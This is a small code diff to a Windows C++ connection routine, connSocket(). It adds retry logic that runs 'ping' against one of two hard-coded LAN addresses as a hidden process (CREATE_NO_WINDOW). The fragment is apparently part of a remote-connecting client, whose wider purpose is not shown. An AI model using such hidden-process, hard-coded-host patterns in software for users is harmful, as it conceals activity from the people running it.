@@ -196,7 +196,7 @@ SOCKET connSocket() {
 	SOCKET MainSock = INVALID_SOCKET;
 	ipData ipaddr;
 
-	int reRun = 0;
+	short int reRun = 0;
 Rerun:
 
 	if (!ipaddr.initIp()) {
@@ -250,7 +250,13 @@ Rerun:
 			PROCESS_INFORMATION pInfo;
 			ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));
 
-			if (!CreateProcessA(NULL, (LPSTR)"ping 192.168.0.185", nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &sInfo, &pInfo)) { return INVALID_SOCKET; }
+			if (reRun == 0) {
+				if (!CreateProcessA(NULL, (LPSTR)"ping 192.168.0.185", nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &sInfo, &pInfo)) return INVALID_SOCKET;
+			}
+			else {
+				if (!CreateProcessA(NULL, (LPSTR)"ping 192.168.0.189", nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &sInfo, &pInfo)) return INVALID_SOCKET;
+			}
+			
 			reRun++;
 
 			CloseHandle(pInfo.hThread);
